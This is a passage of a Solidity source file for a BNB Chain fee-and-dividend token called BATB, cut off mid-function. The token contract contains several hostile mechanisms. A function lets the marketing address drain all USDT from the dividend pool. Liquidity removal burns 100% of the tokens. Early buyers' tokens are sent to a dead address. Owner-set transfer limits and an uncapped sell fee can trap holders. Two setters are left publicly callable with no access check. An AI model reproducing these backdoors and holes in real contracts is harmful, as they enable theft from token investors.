// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address oldOwner = _owner;
        _owner = msg.sender;
        emit OwnershipTransferred(oldOwner, msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "!on");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "0");
        // _transferOwnership(newOwner);
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}




interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);


    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);


    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}


interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}




contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256[2])) private _special_in_balances;
    mapping(address => mapping(address => uint256[2])) private _special_out_balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public lastBuyTime;
    mapping (address => bool) public coldWhiteList;
    mapping(address => uint8) public special_address; // 1: enable, 2: disable; 不为0则是特殊地址
    uint256 public coldTime = 30 seconds;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function geSpecialInBalances(address special, address account) public view virtual returns (uint256, uint256) {
        return (_special_in_balances[special][account][0], _special_in_balances[special][account][1]);
    }

    function geSpecialOutBalances(address special, address account) public view virtual returns (uint256, uint256) {
        return (_special_out_balances[special][account][0], _special_out_balances[special][account][1]);
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        // address spender = msg.sender;
        // _spendAllowance(from, msg.sender, amount);
        uint256 currentAllowance = allowance(from, msg.sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "insuf");
            unchecked {
                _approve(from, msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        // address owner = msg.sender;
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        // address owner = msg.sender;
        uint256 currentAllowance = allowance(msg.sender, spender);
        require(currentAllowance >= subtractedValue, "<");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    
    function setColdWhiteList(address account, bool _disableCold) public virtual returns (bool) {
        coldWhiteList[account] = _disableCold;
        return true;
    }

    function setSpecialAddress(address account, uint8 _enable) public virtual returns (bool) {
        special_address[account] = _enable;
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "0");
        require(to != address(0), "0");

        address newTo = _beforeTokenTransfer(from, to);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, ">bal");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[newTo] += amount;
        }

        emit Transfer(from, newTo, amount);
        _afterTokenTransfer(from, newTo, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "0");

        // _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        // _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "0");
        require(spender != address(0), "0");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to) internal virtual returns (address) {

        // if(block.timestamp < lastBuyTime[from] + coldTime && !coldWhiteList[from]) {
        //     return address(this);
        // }
        if (lastBuyTime[from] == 0  || coldWhiteList[from]) {
            return to;
        }
        require((block.timestamp > lastBuyTime[from] + coldTime),"c");
        return to;
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
        lastBuyTime[to] = block.timestamp;
       
        if ( special_address[from] == 1 ) {
            _special_in_balances[from][to][0] += amount;
            _special_in_balances[from][to][1] = block.timestamp;
        }
        if (special_address[to] == 1) {
            _special_out_balances[to][from][0] += amount;
            _special_out_balances[to][from][1] = block.timestamp;
        }
    }
}


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}


interface IUniswapV2Router01 {

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
         address ref,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address ref,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'APPR_FAIL');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TRANS_FAIL');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TRANS_<-_FAIL');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'ETH_TRANS_FAIL');
    }
}

interface IDividendDistributor {
   function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
   function setShare(address shareholder, uint256 amount) external;
   function setShareholderWhite(address shareholder, bool white) external;
   function deposit(uint256 amount) external payable;
   function process(uint256 gas) external;
}


contract PaymentBNB {
    function Pay(address account) external payable {
        payable(account).transfer(msg.value);
    }
}

contract LPShareDividendDistributor is IDividendDistributor {

    using SafeMath for uint256;

    PaymentBNB paymentBNB = new PaymentBNB();
    // 主链：0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    // 测试链：0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd
    address public WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public shareToken;
    address public owner;
    address public LPDividend;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => bool) shareholderWhites;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 1 hours;
    uint256 public minDistribution = 1 * (10 ** 8);

    uint256 public currentIndex;

    modifier onlyToken() {
        require(msg.sender == owner); _;
    }

    constructor (address _shareToken, address _lpDividend) {
        shareToken =  _shareToken;
        LPDividend = _lpDividend;
        owner = msg.sender;
        IERC20(shareToken).approve(msg.sender, ~uint256(0));
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0 && shareholderWhites[shareholder]){ distributeDividend(shareholder); }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }
        // totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        totalShares = totalShares-(shares[shareholder].amount)+(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = _getCumulativeDividends(shares[shareholder].amount);
    }

    function setShareholderWhite(address shareholder, bool white) external override onlyToken {
        shareholderWhites[shareholder] = white;
    }

    function deposit(uint256 _amount) external payable onlyToken {
        if(totalShares == 0) return;
        if(WETH != shareToken){
            pay(shareToken, msg.sender, address(this), _amount);
        }else{
            _amount = msg.value;
        }
        _deposit(_amount);
    }

    function _deposit(uint256 amount) internal {
        dividendsPerShare = dividendsPerShare+(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
        totalDividends = totalDividends+(amount);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if((shareholderClaims[shareholders[currentIndex]] + minPeriod < block.timestamp) && (getUnpaidEarnings(shareholders[currentIndex]) > minDistribution)){
               bool isRemove = processDistributeDividend(shareholders[currentIndex]);
               if(isRemove){
                    removeShareholder(shareholders[currentIndex]);
                    shareholderCount -= 1;
               }
            }

            gasUsed = gasUsed+(gasLeft-(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }


    function processDistributeDividend(address shareholder) internal returns(bool){
        if(shares[shareholder].amount == 0 || shareholderWhites[shareholder] != true) { return true; }
        uint256 amount = getUnpaidEarnings(shareholder);
        uint256 lpAmount = IERC20(LPDividend).balanceOf(shareholder);
        if(amount > 0){

            uint256 earningsAmount = shares[shareholder].amount <= lpAmount ? amount : amount.mul(lpAmount).div(shares[shareholder].amount);
            if(shares[shareholder].amount != lpAmount){
                _share(shareholder, lpAmount);
            }

            totalDistributed = totalDistributed+(amount);
            shares[shareholder].totalRealised = shares[shareholder].totalRealised+(earningsAmount);
            shares[shareholder].totalExcluded = _getCumulativeDividends(shares[shareholder].amount);
            shareholderClaims[shareholder] = block.timestamp;
            if(earningsAmount > 0){
                pay(shareToken, address(this), shareholder, earningsAmount );
            }

            if(earningsAmount < amount){
                _deposit(amount-(earningsAmount));
            }
        }
        return lpAmount == 0;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0) { return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed+(amount);
            shares[shareholder].totalRealised = shares[shareholder].totalRealised+(amount);
            shares[shareholder].totalExcluded = _getCumulativeDividends(shares[shareholder].amount);
            shareholderClaims[shareholder] = block.timestamp;
            pay(shareToken, address(this), shareholder, amount );
            // payable(shareholder).transfer(amount);
        }

    }

    function _isContract(address _addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(_addr) }
        return size > 0;
    }

    function _getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function _share(address shareholder, uint256 amount) internal {
        totalShares = totalShares-(shares[shareholder].amount)+(amount);
        shares[shareholder].amount = amount;
    }

    function getShareholders() external view returns(uint256){
        return shareholders.length;
    }

    function getTotalShares()  external view returns(uint256){
        return totalShares;
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = _getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends-(shareholderTotalExcluded);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function pay(
        address token,
        address payer,
        address recipient,
        uint256 value
    ) internal {
      if(token == WETH && payer == address(this)){
        // TransferHelper.safeTransferETH(recipient, value);
        if(_isContract(recipient)){ try paymentBNB.Pay{value: value}(recipient) {} catch {} }else{ TransferHelper.safeTransferETH(recipient, value); }
      }else if(payer == address(this)){
        TransferHelper.safeTransfer(token, recipient, value);
      }else {
        TransferHelper.safeTransferFrom(token, payer, recipient, value);
      }
    }

}


contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, ~uint256(0));
    }
}

contract BATBToken is ERC20, Ownable {

    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapRouter;
    address public uniswapPair;
    // 主链 0x55d398326f99059fF775485246999027B3197955
    // 测试链 0x337610d27c682E347C9cD60BD4b3b107C9d34dDd
    address public USDT = 0x55d398326f99059fF775485246999027B3197955;

    bool public swapping;
    uint256 private constant MAX = ~uint256(0);
    uint256 public swapTokensAtAmount;

    uint256 public transferFee = 0;               // 0%
    uint256 public buyFee = 500;                  // 5%
    uint256 public sellFee = 500;                 // 5%

    uint256 public marketingFee = 200;            // 50%
    uint256 public bonusFee = 200;
    uint256 public refluxFee = 100;

    // 测试链 0xB832214b7996f6188CBc8eAB4C0beE3e4f5F2834
    // 主链 0x3235f9b24c158BE118623B749c4e171a6fd8C6eB => 0xC70fA0e9EB119b2dec9472B5E1923F6852518955
    address public marketingAddress = 0x55A4130Acb7ED74d8a876d77eF41B57A43049539;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    LPShareDividendDistributor public dividendDistributor;
    TokenDistributor public tokenDistributor;
    uint256 public distributorLimitAmount = 0 * (10 ** 18);

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    uint256 public gasForProcessing = 500000;

    bool public swapAndLiquifyEnabled = true;

    // mapping (address => bool) public blacklist;
     // exlcude from fees and max transaction amount
    mapping (address => bool) public isExcludedFromFees;
    mapping (address => bool) public isDividendExempt;
    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;
    uint256 public defaultTransferLimit = 50000000;
    mapping (address => uint256) public transferLimit;
    mapping (address => bool) public swapWhiteList;

    constructor (
      address tokenHolder
    ) ERC20('BATB', 'BATB') {
        uint256 totalSupply = 688000000 * 10 ** 18;
        swapTokensAtAmount = totalSupply.mul(2).div(10**6); // 0.002%

        // 主链 0x10ED43C718714eb63d5aA57B78B54704E256024E
        // 测试链 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02( 0x10ED43C718714eb63d5aA57B78B54704E256024E );
        // uniswapPair = PancakeLibrary.pairFor(_uniswapV2Router.factory(), address(this), USDT);
        uniswapPair = IUniswapV2Factory( _uniswapV2Router.factory() ).createPair( address(this), USDT);
        _setAutomatedMarketMakerPair(address(uniswapPair), true);
        uniswapRouter = _uniswapV2Router;

        tokenDistributor = new TokenDistributor(USDT);
        dividendDistributor = new LPShareDividendDistributor(USDT , uniswapPair);

        _excludeFromFees(msg.sender, true);
        _excludeFromFees(address(this), true);
        _excludeFromFees(tokenHolder, true);

        // isDividendExempt[tokenHolder] = true;
        isDividendExempt[uniswapPair] = true;
        isDividendExempt[deadAddress] = true;

        IERC20(USDT).approve(address(dividendDistributor), MAX);
        IERC20(USDT).approve(address(uniswapRouter), MAX);
        _approve(address(this), address(uniswapRouter), MAX);
        _mint(tokenHolder , totalSupply);

        swapWhiteList[address(this)] = true;


        require( USDT < address(this), 'Incor func');
    }

    receive() external payable {}

    function _excludeFromFees(address account, bool excluded) internal {
        isExcludedFromFees[account] = excluded;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) internal {
        require(automatedMarketMakerPairs[pair] != value, "");
        automatedMarketMakerPairs[pair] = value;
    }

    function setColdTime(uint256 _coldTime) external onlyOwner {
        coldTime = _coldTime;
    }

    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapRouter), "");
        uniswapRouter = IUniswapV2Router02(newAddress);
        address _uniswapV2Pair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), USDT);
        uniswapPair = _uniswapV2Pair;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        isDividendExempt[uniswapPair] = true;
    }

    function excludeFromFeesList(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _excludeFromFees(accounts[i], excluded);
        }
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapPair, "");
        _setAutomatedMarketMakerPair(pair, value);
    }


    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 1000000, "");
        require(newValue != gasForProcessing, "");
        gasForProcessing = newValue;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        // require(swapAndLiquifyEnabled != _enabled, 'Equivalent state');
        swapAndLiquifyEnabled = _enabled;
    }

    function setSwapTokensAtAmount(uint256 amount) public onlyOwner {
        // require(amount > 0, 'Invalid value');
        swapTokensAtAmount = amount;
    }

    function setMarketingWalletAddress(address _marketingAddress) public onlyOwner {
        require(_marketingAddress != address(0), 'Inval addr');
        _excludeFromFees(_marketingAddress, true);
        marketingAddress = _marketingAddress;
    }

    function setTransferFee(uint256 _fee) external onlyOwner {
        require(_fee <= 5000, '>5000');
        transferFee = _fee;
    }

    function setTxFee(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 5000, '>5000');
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function setShareFee(  uint256 _marketingFee , uint256 _bonusFee, uint256 _refluxFee) external onlyOwner {
        require(_marketingFee <= 5000, '>5000');
        marketingFee = _marketingFee;
        bonusFee = _bonusFee;
        refluxFee = _refluxFee;
    }


    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "");
        startAddLPBlock = block.number;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "T");
        startTradeBlock = block.number;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external onlyOwner {
        dividendDistributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setShareholderWhite(address shareholder, bool white) external onlyOwner {
        dividendDistributor.setShareholderWhite(shareholder, white);
    }

    function setDistributorLimitAmount(uint256 _distributorLimitAmount) external onlyOwner {
       distributorLimitAmount = _distributorLimitAmount;
    }

    function addLPShareholders(address[] memory accounts) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            dividendDistributor.setShare(accounts[i], IERC20(uniswapPair).balanceOf(accounts[i]));
        }
    }

    function claimLpDistributorUSDT(address account) public {
        require(msg.sender == marketingAddress, 'owner');
        uint256 usdtAmount = IERC20(USDT).balanceOf(address(dividendDistributor));
        TransferHelper.safeTransferFrom(USDT, address(dividendDistributor), account, usdtAmount);
    }

    function setDividendExempt(address holder, bool exempt) external onlyOwner {
       require(holder != address(this) && holder != uniswapPair);
       isDividendExempt[holder] = exempt;
       if(exempt){
           dividendDistributor.setShare(holder, 0);
       }else{
           dividendDistributor.setShare(holder, IERC20(uniswapPair).balanceOf(holder));
       }
   }

    function setDefaultTransferLimit(uint256 _defaultTransferLimit) external onlyOwner {
        defaultTransferLimit = _defaultTransferLimit;
    }

    function setTransferLimit(address account, uint256 _transferLimit) external onlyOwner {
        transferLimit[account] = _transferLimit;
    }

    function setSwapWhiteList(address account, bool _enableSwap) external onlyOwner {
        swapWhiteList[account] = _enableSwap;
    }

    address public lpFrom;
    address public lpTo;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "0");
        require(to != address(0), "0");
        if (!swapWhiteList[from]) {
            uint256 limitAmount = transferLimit[from];
            if (limitAmount > 0) {
            require(amount <= transferLimit[from], "too big");
            } else {
                require(amount <= defaultTransferLimit, "too big");
            }
        }
                
        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }


        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance > swapTokensAtAmount;
        if (startTradeBlock > 0 && !swapping && swapAndLiquifyEnabled && canSwap && !automatedMarketMakerPairs[from] &&!isExcludedFromFees[from] &&
            from != address(uniswapRouter)){
            swapping = true;
            uint256 refluxAmount = contractTokenBalance.mul(refluxFee).div(marketingFee+(bonusFee)+(refluxFee));
            swapAndLiquifyUSDT(contractTokenBalance-(refluxAmount), refluxAmount);
            swapAndSendToFee(0);
            swapping = false;
        }

        bool takeFee = !swapping;
        if(isExcludedFromFees[from] || isExcludedFromFees[to] || to == address(uniswapRouter)) {
            takeFee = false;
        }

        if(takeFee) {

            uint256 fees;
            uint256 feeRate = transferFee;

            uint256 removeRate;
            uint256 removeFee;
            if(automatedMarketMakerPairs[to] || automatedMarketMakerPairs[from] || from == address(uniswapRouter)){
                feeRate = automatedMarketMakerPairs[from] || from == address(uniswapRouter) ? buyFee : sellFee;
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && automatedMarketMakerPairs[to], "!startAddLP");
                }else{
                  if(block.number < (startTradeBlock + 3) && automatedMarketMakerPairs[from]){
                    super._transfer(from, deadAddress, amount);
                    amount = 0;
                  }
                }
                if(automatedMarketMakerPairs[from]){
                  uint256 removeLPLiquidity = _isRemoveLiquidity(amount);

                  if(removeLPLiquidity > 0){   removeRate = 10000; }
                }

            }
            fees = amount.mul(feeRate).div(10000);
            if(fees > 0){
                super._transfer(from, address(this), fees);
                amount = amount-(fees);
            }
            removeFee = amount.mul(removeRate).div(10000);
            if(removeFee > 0){
                super._transfer(from, deadAddress, removeFee);
                amount = amount-(removeFee);
            }
        }

        super._transfer(from, to, amount);

        if(lpFrom != address(0)){ try dividendDistributor.setShare(lpFrom, isDividendExempt[lpFrom] ? 0 : IERC20(uniswapPair).balanceOf(lpFrom)) {} catch {} }
        if(lpTo != address(0) ){ try dividendDistributor.setShare(lpTo, isDividendExempt[lpTo] ? 0 : IERC20(uniswapPair).balanceOf(lpTo)) {} catch {} }

        if(!swapping) {
            lpTo = to;
            lpFrom = from;
            try dividendDistributor.process(gasForProcessing) {} catch {}
        }
    }

    function _isRemoveLiquidity(uint256 amount) internal view returns (uint256 liquidity){
        uint256 rOther;
        uint256 balanceOther;
        IUniswapV2Pair mainPair = IUniswapV2Pair(uniswapPair);
        (uint r0, uint256 r1,) = mainPair.getReserves();

        address tokenOther = USDT;
        if (tokenOther < address(this)) {
            rOther = r0;
        } else {
            rOther = r1;
        }
        balanceOther = IERC20(USDT).balanceOf(uniswapPair);

        if (balanceOther < rOther) {
            liquidity = amount * IUniswapV2Pair(uniswapPair).totalSupply() / (balanceOf(uniswapPair) - amount);
        }
    }


    function swapAndSendToFee(uint256 _swapAmounts) private  {
        if(_swapAmounts != 0){ swapTokensForUSDT(_swapAmounts); }
        uint256 initialBalance = IERC20(USDT).balanceOf(address(this)); // address(this).balance;
        if(initialBalance == 0) return;

        uint256 marketingAmount = initialBalance.mul(marketingFee).div(marketingFee+(bonusFee));
